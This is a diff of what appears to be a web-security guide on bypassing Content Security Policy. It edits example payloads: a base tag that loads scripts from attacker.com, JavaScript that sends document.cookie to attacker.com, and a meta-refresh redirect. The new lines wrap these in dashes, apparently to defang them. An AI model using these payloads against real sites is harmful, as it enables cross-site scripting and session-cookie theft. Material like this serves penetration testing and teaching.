@@ -235,7 +235,7 @@ If the **base-uri** directive is missing you can abuse it to perform a [**dangli
 Moreover, if the **page is loading a script using a relative path** (like `/js/app.js`) using a **Nonce**, you can abuse the **base** **tag** to make it **load** the script from **your own server achieving a XSS.**\
 If the vulnerable page is loaded with **httpS**, make use a httpS url in the base.
 
-<p>html<base href="https://www.attacker.com/"></p>
+<p>html<---base href="https://www.attacker.com/"----></p>
 
 ### AngularJS events
 
@@ -423,13 +423,13 @@ You could just update the location to send to the attackers server the secret in
 
 <p>javascript
 var sessionid = document.cookie.split('=')[1]+"."; 
-document.location = "https://attacker.com/?" + sessionid;</p>
+document.location = "-----https://attacker.com/?-----" + sessionid;</p>
 
 ### Meta tag
 
 You could redirect injecting a meta tag (this is just a redirect, this won't leak content)
 
-<p>html<meta http-equiv="refresh" content="1; http://attacker.com"></p>
+<p>html<-----meta http-equiv="refresh" content="1; http://attacker.com"------></p>
 ```
 
 ### DNS Prefetch
